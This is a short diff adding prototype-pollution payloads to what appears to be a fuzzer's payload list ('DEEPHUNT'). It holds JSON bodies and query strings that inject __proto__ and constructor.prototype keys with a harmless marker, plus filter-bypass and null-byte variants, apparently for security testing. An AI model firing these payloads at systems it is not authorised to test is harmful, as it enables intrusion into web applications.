@@ -1,0 +1,9 @@
+# DEEPHUNT payload class: prototype_pollution (Wave 1 additions, 2026-09-27)
+# Shapes are pattern families; the fuzzer instantiates them.
+{"__proto__": {"dh_marker": "1"}}
+{"constructor": {"prototype": {"dh_marker": "1"}}}
+{"__proto__": {"json spaces": 10}}
+?__proto__[dh_marker]=1
+?constructor[prototype][dh_marker]=1
+?__pro__proto__to__[dh_marker]=1
+{"__proto__\u0000": {"dh_marker": "1"}}
